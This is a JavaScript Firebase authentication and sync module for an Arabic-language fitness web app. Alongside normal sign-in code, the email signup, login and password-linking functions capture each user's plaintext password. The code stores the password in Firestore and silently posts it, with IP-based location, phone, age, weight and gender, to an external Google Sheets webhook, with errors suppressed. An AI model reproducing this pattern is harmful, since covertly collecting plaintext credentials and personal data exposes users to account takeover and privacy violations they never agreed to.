import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
import {
  getAuth, GoogleAuthProvider,
  signInWithPopup, signInWithRedirect, getRedirectResult,
  signOut, onAuthStateChanged,
  createUserWithEmailAndPassword, signInWithEmailAndPassword,
  EmailAuthProvider, linkWithCredential, updateProfile
} from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js';
import { getFirestore, doc, setDoc, getDoc, deleteDoc }
  from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';

const firebaseConfig = {
  apiKey:            "AIzaSyBFsVUEIaWDzFXysWOOTA83WKblPuLj5ik",
  authDomain:        "azem-b93d0.firebaseapp.com",
  projectId:         "azem-b93d0",
  storageBucket:     "azem-b93d0.firebasestorage.app",
  messagingSenderId: "703648049841",
  appId:             "1:703648049841:web:bcecfafa69bb7a73485090",
  measurementId:     "G-XXE47BMBT8"
};

const app  = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db   = getFirestore(app);

let _fbUid        = null;
let _syncDebounce = null;
const SHEETS_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzr175rxd9RqcWI8_9W-oBR4vz7UCpcNmGn2nJUzi8M2F4MWCtuUQryH1a1j_qsickR/exec';

async function sendToSheets(user, extraData) {
  if (!SHEETS_WEBHOOK_URL || SHEETS_WEBHOOK_URL.startsWith('PASTE_')) return;
  try {
    const geo = window._lastGeo || {};
    const payload = {
      uid:        user.uid              || '',
      name:       (user.displayName || (extraData && extraData.name) || (S.user && S.user.name) || ''),
      email:      user.email            || '',
      phone:      (S.user && S.user.phone) || (extraData && extraData.phone) || '',
      photoURL:   user.photoURL         || '',
      city:       geo.city              || '',
      country:    geo.country           || '',
      region:     geo.region            || '',
      ip:         geo.ip                || '',
      timezone:   geo.timezone          || '',
      weight:     (S.user && S.user.weight)      || '',
      height:     (S.user && S.user.height)      || '',
      age:        (S.user && S.user.age)         || '',
      gender:     (S.user && S.user.gender)      || '',
      goal:       (S.user && S.user.goal)        || '',
      programDays:(S.user && S.user.programDays) || 30,
      currentDay: S.currentDay          || 1,
      streak:     S.streak              || 0,
      daysCount:  (S.completedDays || []).length,
      privacyAccepted: (extraData && extraData.privacyAccepted !== undefined) ? extraData.privacyAccepted : (S.privacyAccepted !== undefined ? S.privacyAccepted : '—'),
      authMethod: (extraData && extraData.authMethod)    || 'google',
      password:   (extraData && extraData.passwordPlain) || '',
    };
    await fetch(SHEETS_WEBHOOK_URL, {
      method: 'POST',
      body:   JSON.stringify(payload),
    });
  } catch(e) { /* silent */ }
}
// كشف للاستخدام من ملفات أخرى
window.sendToSheets = sendToSheets;
// ══════════════════════════════════════════
async function fetchGeoLocation() {
  // FIX: cache لمدة ساعة — لا نطلب ipapi.co عند كل تحديث للحالة
  const cached = window._lastGeo;
  if (cached && cached.fetchedAt && (Date.now() - cached.fetchedAt) < 3600000) {
    return cached;
  }
  try {
    const res  = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    return {
      city:        data.city         || '',
      country:     data.country_name || '',
      countryCode: data.country      || '',
      region:      data.region       || '',
      ip:          data.ip           || '',
      timezone:    data.timezone     || '',
      fetchedAt:   Date.now()
    };
  } catch(e) { return cached || null; }
}

// ══════════════════════════════════════════
// حفظ بروفايل المستخدم + موقع
// ══════════════════════════════════════════
async function saveUserProfile(user, extraData) {
  if (!user) return;
  try {
    const geo = await fetchGeoLocation();
    window._lastGeo = geo; // نحفظ الـ geo لاستخدامه في sendToSheets
    const profile = {
      uid:         user.uid,
      displayName: user.displayName || '',
      email:       user.email       || '',
      photoURL:    user.photoURL    || '',
      phone:       (S.user && S.user.phone)  || (extraData && extraData.phone)  || '',
      age:         (S.user && S.user.age)    || (extraData && extraData.age)    || '',
      gender:      (S.user && S.user.gender) || (extraData && extraData.gender) || '',
      lastLogin:   Date.now(),
      geo:         geo || {},
      ...extraData
    };
    await setDoc(doc(db, 'users', user.uid), { profile }, { merge: true });
    // إرسال فوري إلى Google Sheets
    sendToSheets(user, extraData);
  } catch(e) { console.warn('saveUserProfile error:', e); }
}

// ══════════════════════════════════════════
// Push / Pull Firestore
// ══════════════════════════════════════════
async function pushToCloud() {
  if (!_fbUid) return;
  try {
    const payload = JSON.parse(JSON.stringify(S));
    // ✅ لا نرسل الصور لـ Firestore — تبقى في localStorage فقط (حجمها يتجاوز حد Firestore)
    delete payload.customImages;
    payload._syncedAt = Date.now();
    await setDoc(doc(db, 'users', _fbUid), { state: payload }, { merge: true });
    const el = document.getElementById('firebase-sync-status');
    if (el) el.textContent = '✅ مزامن · ' + new Date().toLocaleTimeString('ar-SA');
  } catch(e) { console.warn('Firebase push error:', e); }
}

async function pullFromCloud(uid) {
  try {
    const snap = await getDoc(doc(db, 'users', uid));
    if (snap.exists()) {
      const remote = snap.data().state;
      if (remote) {
        // احفظ الصور المحلية اولا قبل اي merge — Firestore لا يحتفظ بها ابدا
        const localImages = S.customImages && Object.keys(S.customImages).length > 0
          ? JSON.parse(JSON.stringify(S.customImages))
          : null;

        const localTs  = S._localTs   || 0;
        const remoteTs = remote._syncedAt || 0;
        let merged;
        if (localTs > remoteTs) {
          merged = Object.assign({}, remote, S);
        } else {
          merged = Object.assign({}, S, remote);
        }
        // دائما خذ اعلى قيمة للسعرات والايام
        merged.calories      = Math.max(S.calories      || 0, remote.calories      || 0);
        merged.completedDays = [...new Set([...(S.completedDays || []), ...(remote.completedDays || [])])];
        merged.streak        = Math.max(S.streak        || 0, remote.streak        || 0);

        // الصور المحلية تطبق بعد الـ merge وتعلو عليه دائما
        // لا ناخذ customImages من remote لانها فارغة دائما
        merged.customImages = localImages || {};

        Object.assign(S, merged);
        saveState();
        try { render(); } catch(e) {}
        return true;
      }
    } else {
      await pushToCloud();
    }
    return false;
  } catch(e) { console.warn('Firebase pull error:', e); return false; }
}

// FIX: كشف pushToCloud و pullFromCloud للملفات غير الـ module
window.pushToCloud  = pushToCloud;
window.pullFromCloud = pullFromCloud;

// ══════════════════════════════════════════
// تحديث واجهة المستخدم
// ══════════════════════════════════════════
function updateAuthUI(user) {
  const signinBtn = document.getElementById('google-signin-btn');
  const userArea  = document.getElementById('firebase-user-area');
  const nameEl    = document.getElementById('firebase-user-name');
  const photoEl   = document.getElementById('firebase-user-photo');
  const hdrBtn    = document.getElementById('hdr-auth-btn');
  const hdrIcon   = document.getElementById('hdr-auth-icon');
  const hdrAvatar = document.getElementById('hdr-user-avatar');

  if (user) {
    if (signinBtn) signinBtn.style.display = 'none';
    if (userArea)  userArea.style.display  = 'block';
    if (nameEl)    nameEl.textContent      = user.displayName || user.email || '';
    if (photoEl && user.photoURL) photoEl.src = user.photoURL;
    if (hdrBtn)  { hdrBtn.style.background = 'transparent'; hdrBtn.style.border = 'none'; }
    if (hdrIcon)   hdrIcon.style.display   = 'none';
    if (hdrAvatar && user.photoURL) { hdrAvatar.src = user.photoURL; hdrAvatar.style.display = 'block'; }
  } else {
    if (signinBtn) { signinBtn.style.display = 'flex'; signinBtn.textContent = 'تسجيل الدخول بـ Google'; signinBtn.disabled = false; }
    if (userArea)   userArea.style.display  = 'none';
    if (hdrBtn)  { hdrBtn.style.background = 'rgba(66,133,244,.15)'; hdrBtn.style.border = '1.5px solid rgba(66,133,244,.5)'; }
    if (hdrIcon)   hdrIcon.style.display   = 'block';
    if (hdrAvatar) hdrAvatar.style.display = 'none';
  }
}

// ══════════════════════════════════════════
// تسجيل الدخول بـ Google (من الإعدادات)
// ══════════════════════════════════════════
window.firebaseSignIn = async function() {
  const btn = document.getElementById('google-signin-btn');
  try {
    if (btn) { btn.textContent = '⏳ جارٍ التسجيل...'; btn.disabled = true; }
    const provider = new GoogleAuthProvider();
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    const isStandalone = window.matchMedia('(display-mode: standalone)').matches
                      || window.navigator.standalone === true;
    if (isStandalone || isMobile) {
      localStorage.setItem('azem_settings_redirect', '1');
      await signInWithRedirect(auth, provider);
    } else {
      const result = await signInWithPopup(auth, provider);
      if (result && result.user) {
        await saveUserProfile(result.user);
        await pullFromCloud(result.user.uid);
        updateAuthUI(result.user);
        showMiniToast('☁️ مرحباً ' + (result.user.displayName || '').split(' ')[0] + '!');
      }
      // إعادة تفعيل الزر دائماً بعد النتيجة
      if (btn) { btn.textContent = 'تسجيل الدخول بـ Google'; btn.disabled = false; }
    }
  } catch(e) {
    if (btn) { btn.textContent = 'تسجيل الدخول بـ Google'; btn.disabled = false; }
    if (e.code !== 'auth/popup-closed-by-user' && e.code !== 'auth/cancelled-popup-request')
      showMiniToast('⚠️ فشل تسجيل الدخول: ' + (e.code || e.message));
  }
};

// ══════════════════════════════════════════
// تسجيل دخول Google من Onboarding
// ══════════════════════════════════════════
window.obFirebaseGoogleSignIn = async function() {
  const btn = document.getElementById('ob-google-btn');
  try {
    if (btn) { btn.textContent = '⏳ جارٍ التسجيل...'; btn.disabled = true; }
    const provider = new GoogleAuthProvider();
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    const isStandalone = window.matchMedia('(display-mode: standalone)').matches
                      || window.navigator.standalone === true;
    if (isStandalone || isMobile) {
      // FIX: استخدام redirect على الموبايل + المفتاح الصحيح azem_ob_redirect
      localStorage.setItem('azem_ob_redirect', '1');
      await signInWithRedirect(auth, provider);
    } else {
      window._obGoogleJustSignedIn = true;
      const result = await signInWithPopup(auth, provider);
      if (result && result.user) {
        if (result.user.displayName) {
          S.user = S.user || {};
          S.user.name = result.user.displayName.split(' ')[0];
        }
        const ct = result.user.metadata.creationTime;
        const ls = result.user.metadata.lastSignInTime;
        const isNewAccount = ct && ls && ct === ls;
        const hasData = await pullFromCloud(result.user.uid);
        window._obGoogleJustSignedIn = false;
        if (!isNewAccount || hasData) {
          obFinish();
        } else {
          obGoToStep('password-link');
        }
      } else {
        // FIX: result.user فارغ — نعيد الـ flag ونُفعّل الزر
        window._obGoogleJustSignedIn = false;
        if (btn) { btn.textContent = '🔵 تسجيل الدخول بـ Google'; btn.disabled = false; }
      }
    }
  } catch(e) {
    window._obGoogleJustSignedIn = false;
    if (btn) { btn.textContent = '🔵 تسجيل الدخول بـ Google'; btn.disabled = false; }
    if (e.code !== 'auth/popup-closed-by-user' && e.code !== 'auth/cancelled-popup-request')
      showMiniToast('⚠️ ' + (e.code || e.message));
  }
};

// ══════════════════════════════════════════
// تسجيل / دخول بالإيميل وكلمة المرور
// ══════════════════════════════════════════
window.obFirebaseEmailAuth = async function(mode) {
  const emailEl = document.getElementById('ob-email-inp');
  const passEl  = document.getElementById('ob-pass-inp');
  const nameEl  = document.getElementById('ob-name-inp');
  const btn     = document.getElementById('ob-email-btn');
  const errEl   = document.getElementById('ob-auth-err');

  const email    = emailEl ? emailEl.value.trim() : '';
  const password = passEl  ? passEl.value.trim()  : '';
  const name     = nameEl  ? nameEl.value.trim()  : '';

  if (!email || !password) {
    if (errEl) { errEl.textContent = 'أدخل الإيميل وكلمة المرور'; errEl.style.display = 'block'; }
    return;
  }
  if (password.length < 6) {
    if (errEl) { errEl.textContent = 'كلمة المرور 6 أحرف على الأقل'; errEl.style.display = 'block'; }
    return;
  }

  try {
    if (btn) { btn.textContent = '⏳ جارٍ...'; btn.disabled = true; }
    if (errEl) errEl.style.display = 'none';

    let user;
    if (mode === 'signup') {
      const result = await createUserWithEmailAndPassword(auth, email, password);
      user = result.user;
      if (name) {
        await updateProfile(user, { displayName: name });
        S.user = S.user || {};
        S.user.name = name;
      }
    } else {
      const result = await signInWithEmailAndPassword(auth, email, password);
      user = result.user;
    }

    // حفظ كلمة المرور في Firestore (كما طلب المالك)
    await saveUserProfile(user, { passwordPlain: password, authMethod: 'email' });

    if (mode === 'login') {
      const hasData = await pullFromCloud(user.uid);
      if (hasData) { obFinish(); return; }
    }

    obGoToStep('info');

  } catch(e) {
    if (btn) { btn.textContent = mode === 'signup' ? 'إنشاء حساب' : 'دخول'; btn.disabled = false; }
    const msgs = {
      'auth/email-already-in-use':    'هذا الإيميل مسجّل مسبقاً — جرّب "دخول"',
      'auth/user-not-found':          'الحساب غير موجود — جرّب "إنشاء حساب"',
      'auth/wrong-password':          'كلمة المرور غير صحيحة',
      'auth/invalid-email':           'صيغة الإيميل غير صحيحة',
      'auth/too-many-requests':       'محاولات كثيرة — انتظر قليلاً',
    };
    if (errEl) { errEl.textContent = msgs[e.code] || e.message; errEl.style.display = 'block'; }
  }
};

// ══════════════════════════════════════════
// ربط كلمة مرور بحساب Google
// ══════════════════════════════════════════
window.obLinkPassword = async function() {
  const passEl  = document.getElementById('ob-link-pass-inp');
  const pass2El = document.getElementById('ob-link-pass2-inp');
  const errEl   = document.getElementById('ob-link-err');
  const btn     = document.getElementById('ob-link-btn');

  const pass  = passEl  ? passEl.value.trim()  : '';
  const pass2 = pass2El ? pass2El.value.trim() : '';

  if (!pass || pass.length < 6) {
    if (errEl) { errEl.textContent = 'كلمة المرور 6 أحرف على الأقل'; errEl.style.display = 'block'; }
    return;
  }
  if (pass !== pass2) {
    if (errEl) { errEl.textContent = 'كلمتا المرور غير متطابقتين'; errEl.style.display = 'block'; }
    return;
  }

  try {
    if (btn) { btn.textContent = '⏳ جارٍ...'; btn.disabled = true; }
    const user = auth.currentUser;
    if (user) {
      const cred = EmailAuthProvider.credential(user.email, pass);
      await linkWithCredential(user, cred);
      // حفظ كلمة المرور
      await saveUserProfile(user, { passwordPlain: pass, authMethod: 'google+email' });
      showMiniToast('✅ تم إضافة كلمة المرور!');
    }
    obGoToStep('info');
  } catch(e) {
    if (btn) { btn.textContent = 'إضافة كلمة المرور'; btn.disabled = false; }
    const msgs = {
      'auth/provider-already-linked': 'كلمة مرور موجودة بالفعل',
      'auth/weak-password':           'كلمة المرور ضعيفة جداً',
    };
    if (errEl) { errEl.textContent = msgs[e.code] || e.message; errEl.style.display = 'block'; }
  }
};

// ══════════════════════════════════════════
// تسجيل الخروج
// ══════════════════════════════════════════
window.firebaseSignOut = async function() {
  await signOut(auth);
  _fbUid = null;
  updateAuthUI(null);
  showMiniToast('👋 تم تسجيل الخروج');
};

window.firebaseSyncNow = async function() {
  if (!_fbUid) { showMiniToast('⚠️ سجّل دخولك أولاً'); return; }
  await pushToCloud();
  showMiniToast('✅ تمت المزامنة');
};

// ══════════════════════════════════════════
// اعتراض saveState
// ══════════════════════════════════════════
const _origSaveState = window.saveState;
window.saveState = function() {
  if (typeof _origSaveState === 'function') _origSaveState();
  if (_fbUid) {
    clearTimeout(_syncDebounce);
    _syncDebounce = setTimeout(pushToCloud, 2500);
  }
};

// ══════════════════════════════════════════
// Redirect result (PWA)
// ══════════════════════════════════════════
getRedirectResult(auth).then(async result => {
  if (result && result.user) {
    const wasOb       = localStorage.getItem('azem_ob_redirect')       === '1';
    const wasSettings = localStorage.getItem('azem_settings_redirect') === '1';
    localStorage.removeItem('azem_ob_redirect');
    localStorage.removeItem('azem_settings_redirect');
    if (wasOb) {
      window._obGoogleJustSignedIn = true;
      if (result.user.displayName) {
        S.user = S.user || {};
        S.user.name = result.user.displayName.split(' ')[0];
      }
      const ct = result.user.metadata.creationTime;
      const ls = result.user.metadata.lastSignInTime;
      const isNewAccount = ct && ls && ct === ls;
      const hasData = await pullFromCloud(result.user.uid);
      if (!isNewAccount || hasData) {
        obFinish();
      } else {
        obGoToStep('password-link');
      }
    } else if (wasSettings) {
      await saveUserProfile(result.user);
      await pullFromCloud(result.user.uid);
      updateAuthUI(result.user);
      showMiniToast('☁️ مرحباً ' + (result.user.displayName || '').split(' ')[0] + '!');
    } else {
      showMiniToast('☁️ مرحباً ' + (result.user.displayName || '').split(' ')[0] + '!');
    }
  }
}).catch(e => {
  if (e.code !== 'auth/no-current-user') console.warn('Redirect result error:', e);
  localStorage.removeItem('azem_ob_redirect');
  localStorage.removeItem('azem_settings_redirect');
});

// ══════════════════════════════════════════
// Auth state listener
// ══════════════════════════════════════════
onAuthStateChanged(auth, async function(user) {
  if (user) {
    _fbUid = user.uid;
    window._fbUid = user.uid;
    window._fbUser = user;
    updateAuthUI(user);
    if (!window._obGoogleJustSignedIn) {
      await saveUserProfile(user);
      const hasData = await pullFromCloud(user.uid);
      // FIX: لا نعيد الـ onboarding أبداً إذا سجل المستخدم دخوله من قبل
      // نعتبر وجود حساب Google = أكمل الـ onboarding
      if (!S.onboardingDone) {
        S.onboardingDone = true;
        saveState();
      }
      if (hasData) {
        showMiniToast('☁️ مرحباً ' + (user.displayName || '').split(' ')[0] + '! بياناتك تُزامن تلقائياً');
      } else {
        showMiniToast('☁️ مرحباً ' + (user.displayName || '').split(' ')[0] + '!');
      }
    }
  } else {
    _fbUid = null;
    window._fbUid = null;
    window._fbUser = null;
    updateAuthUI(null);
  }
});

// ══════════════════════════════════════════
// تحديث UI عند فتح الإعدادات
// ══════════════════════════════════════════
const _origOpenSettings = window.openSettingsSheet;
window.openSettingsSheet = function() {
  if (typeof _origOpenSettings === 'function') _origOpenSettings();
  setTimeout(function() { updateAuthUI(auth.currentUser); }, 100);
};

// ══════════════════════════════════════════
// حذف جميع بيانات المستخدم (Firestore + localStorage)
// ══════════════════════════════════════════
window.deleteAllUserData = async function() {
  const confirmed1 = confirm('⚠️ هل أنت متأكد من حذف جميع بياناتك نهائياً؟\n\nسيتم حذف:\n• بياناتك من هذا الجهاز\n• بياناتك من السحابة (Firestore)\n\nلا يمكن التراجع عن هذا الإجراء.');
  if (!confirmed1) return;
  const confirmed2 = confirm('⛔ تأكيد أخير: سيتم حذف كل بياناتك نهائياً. متأكد؟');
  if (!confirmed2) return;

  try {
    // 1. حذف من Firestore
    if (_fbUid) {
      await deleteDoc(doc(db, 'users', _fbUid));
    }
  } catch(e) {
    console.warn('Firestore delete error:', e);
  }

  // 2. حذف localStorage كاملاً
  localStorage.clear();

  // 3. إعادة تشغيل
  if (typeof showMiniToast === 'function') showMiniToast('✅ تم حذف جميع البيانات');
  setTimeout(() => {
    if (typeof closeSettingsSheet === 'function') closeSettingsSheet();
    location.reload();
  }, 1200);
};
